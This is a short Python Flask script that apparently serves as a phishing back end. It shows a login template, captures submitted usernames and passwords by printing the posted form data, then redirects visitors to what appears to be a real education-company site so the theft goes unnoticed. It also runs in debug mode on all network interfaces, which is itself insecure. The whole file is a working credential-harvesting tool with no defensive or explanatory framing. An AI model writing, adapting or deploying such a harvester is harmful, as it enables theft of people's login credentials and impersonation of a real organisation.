from flask import Flask, render_template, redirect, make_response, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS after initializing app

@app.route("/auth", methods=["POST"])
def auth():
    print(request.form.to_dict())  # Print received username and password
    # After successful login, redirect to the actual login page
    return "ok", 200

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login")
def login():
    # After successful login, redirect to an external URL
    return redirect("https://pacegroup.dhi-edu.com/pacegroup_pace/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)  # Run with debug mode ON
